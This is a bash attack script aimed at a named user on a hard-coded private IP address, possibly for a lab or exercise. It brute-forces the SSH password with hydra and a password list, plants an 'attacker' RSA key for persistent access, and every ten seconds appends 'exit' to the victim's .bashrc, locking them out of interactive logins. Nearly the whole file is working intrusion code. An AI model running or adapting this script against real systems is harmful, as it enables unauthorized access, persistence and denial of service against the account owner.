#!/bin/bash

cd `dirname $0`

# TODO: to be able to give these value as command line args
USER=shiraishi
HOST=10.1.240.131

# crack shiraishi's password with hydra
echo "Cracking SSH password..."
PASS=`hydra -l $USER -P password_list.txt $HOST ssh 2> /dev/null | grep -E '^.*login.*password' | awk '{print $7}'`

if [ -z "$PASS" ]; then
    echo "Password not found"
    exit
fi

echo "Password: $PASS\n"

# TODO: to be able to skip add public key step
echo "Generating RSA key pair..."
ssh-keygen -q -b 2048 -t rsa -f ./attacker -N ""
echo "done\n"

echo "Adding public key..."
python add_pubkey.py --user $USER --pass $PASS --host $HOST --key ./attacker.pub
echo "done\n"

# execute append_exit.py with cracked password
while : ; do
    echo "Append \"exit\" to ~${USER}/.bashrc"
    python append_exit.py --user $USER --key ./attacker --host $HOST
    echo ""

    sleep 10
done
